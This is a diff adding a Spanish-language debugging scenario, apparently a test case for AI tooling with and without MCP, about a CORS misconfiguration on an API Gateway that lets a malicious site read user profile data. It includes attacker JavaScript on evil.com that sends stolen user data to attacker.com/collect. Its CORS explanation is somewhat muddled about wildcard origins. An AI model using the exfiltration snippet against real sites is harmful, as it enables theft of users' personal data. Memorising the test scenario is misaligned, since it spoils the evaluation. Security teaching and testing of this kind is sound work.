@@ -1,0 +1,75 @@
+Síntoma Reportado:
+"Un pentester encontró que puede acceder a datos de usuarios desde un sitio malicioso en su navegador"
+
+Flujo del Error:
+1. API Gateway configurado con CORS para permitir requests desde frontend:
+```yaml
+   cors:
+     allowOrigins: '*'  # BUG: Permite CUALQUIER origen
+     allowCredentials: true
+     allowHeaders: ['Content-Type', 'Authorization']
+```
+2. Lambda GetUserProfile requiere token JWT en header Authorization
+3. Frontend legítimo (app.company.com) hace request:
+```javascript
+   fetch('https://api.company.com/user/profile', {
+     credentials: 'include',  // Envía cookies
+     headers: {
+       'Authorization': 'Bearer ' + userToken
+     }
+   })
+```
+4. Attacker crea sitio malicioso (evil.com) con código:
+```javascript
+   // Usuario víctima visita evil.com mientras tiene sesión activa en app.company.com
+   fetch('https://api.company.com/user/profile', {
+     credentials: 'include',  // Navegador envía cookies de app.company.com
+     headers: {
+       'Authorization': 'Bearer ' + stolenToken  // Token robado por XSS previo
+     }
+   })
+   .then(res => res.json())
+   .then(data => {
+     // Envía datos del usuario a servidor del attacker
+     fetch('https://attacker.com/collect', {
+       method: 'POST',
+       body: JSON.stringify(data)
+     });
+   });
+```
+5. API Gateway recibe request desde evil.com:
+   - Valida token JWT ✅ (token es válido aunque robado)
+   - Chequea CORS: origin=evil.com está permitido porque allowOrigins='*' ✅
+   - Retorna datos del usuario con header: Access-Control-Allow-Origin: evil.com
+6. Navegador permite que el script en evil.com lea la respuesta
+7. Datos sensibles del usuario (email, dirección, teléfono) son exfiltrados
+
+Causa Raíz:
+- CORS configurado con wildcard '*' en vez de whitelist específica
+- allowCredentials=true combinado con allowOrigins='*' es altamente inseguro
+- No hay validación de Referer header
+- No hay rate limiting por IP para detectar acceso anómalo
+- Tokens JWT no tienen binding a origen específico
+
+Desafío para MCP:
+- Debe buscar logs de API Gateway (ver requests desde dominios sospechosos)
+- Debe buscar configuración de CORS en API Gateway
+- Debe identificar que allowOrigins='*' es inseguro
+- Debe correlacionar requests con origins diferentes (app.company.com vs evil.com)
+- Debe buscar patrón de acceso: mismo usuario desde múltiples IPs/origins
+- Debe entender conceptos de CORS y por qué wildcard + credentials es peligroso
+- Idealmente debería buscar CloudFront logs (si existe) para ver geographic anomalies
+
+Desafío sin-MCP:
+- El síntoma requiere conocimiento de security testing
+- ¿Qué logs pasar sin saber que es un problema de CORS?
+- Necesitaría logs de API Gateway + configuración + entendimiento de CORS
+- El "error" no genera logs de error (requests son técnicamente válidos)
+- Difícil detectar sin security awareness
+
+Preguntas:
+2.- La aplicación valida que un usuario tenga una sesion activa registrada en base de datos. El equipo de ciberseguridad ha reportado que la informacion de la sesion se puede obtener desde sitios sospechosos externos.
+3.- La aplicación valida que un usuario tenga una sesion activa registrada en base de datos. El equipo de ciberseguridad ha reportado que la informacion de la sesion se puede obtener desde sitios sospechosos externos. la aplicación deberia funcionar como sigue:
+- La aplicacion expone un endpoint en una api rest para validar que un usuario tenga una sesion activa
+- Las sesiones activas se validan contra una base de datos
+- La aplicacion utiliza tokens jwt y deben ser validados para utilizar el servicio
